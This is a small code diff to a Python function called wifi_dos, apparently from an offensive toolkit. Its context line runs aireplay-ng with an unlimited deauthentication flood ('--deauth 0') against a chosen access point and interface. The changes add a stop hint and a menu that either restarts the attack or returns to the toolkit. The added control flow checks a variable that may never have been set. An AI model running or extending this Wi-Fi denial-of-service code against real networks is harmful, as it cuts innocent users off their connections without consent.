@@ -125,6 +125,15 @@ def wifi_dos():
 
     try:
         subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic])
+        print('ctrl+c to stop the process')
     except KeyboardInterrupt:
         print("Done!")
+        a=input("If you want to start the program again press 'Y' or else press 'N' to return to main program:")
+    if(a.lower()=='y'):
+        wifi_dos()
+    elif(a.lower()=='n'):
+        import cstool
+        cstool.first()
+    else:
+        quit()
 wifi_dos()
